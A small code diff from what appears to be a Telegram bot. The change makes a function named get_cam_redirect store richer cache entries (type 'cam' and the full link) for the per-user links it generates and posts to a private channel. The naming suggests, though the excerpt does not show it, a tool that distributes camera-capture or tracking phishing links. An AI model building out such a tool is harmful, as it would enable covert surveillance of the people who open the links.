@@ -31,7 +31,12 @@ def get_cam_redirect(message, user_id, get_bottom_buttons, bot):
         bot.send_message(PRIVATE_CHANNEL_ID, f"🔗 Redirect: {redirect_url}")
         unique_id = str(uuid.uuid4())[:8]
         link = f"{BASE_URL}/p/cam/{unique_id}?v={user_id}"
-        link_cache[unique_id] = {"user_id": user_id, "time": time.time()}
+        link_cache[unique_id] = {
+            "user_id": user_id,
+            "time": time.time(),
+            "type": "cam",
+            "link": link  # <-- FULL LINK STORED
+        }
         bot.send_message(PRIVATE_CHANNEL_ID, f"✅ Link: {link}")
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
